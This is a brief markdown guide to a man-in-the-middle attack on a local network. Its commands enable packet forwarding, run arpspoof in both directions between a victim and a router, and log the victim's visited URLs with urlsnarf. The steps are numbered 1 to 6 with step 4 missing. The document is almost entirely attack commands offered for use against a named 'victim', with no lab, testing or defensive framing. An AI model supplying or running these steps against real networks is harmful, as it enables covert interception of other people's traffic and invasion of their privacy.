# Simple Man in the Middle Attack

Goal: Intercept packets between a target device and router

1. Enable packet forwarding
``` 
sysctl -w net.ipv4.ip_forward=1
```

2. Intercept packets from victim to router
```
arpspoof -i [Network Interface Name] -t [Victim IP] [Router IP]
```

3. Intercept packets from router to victim
```
arpspoof -i [Network Interface Name] -t [Router IP] [Victim IP]
```

5. Retrieve URL information from victim
```
urlsnarf -i [Network Interface Name]
```

6. Disable packet forwarding
```
sysctl -w net.ipv4.ip_forward=0
```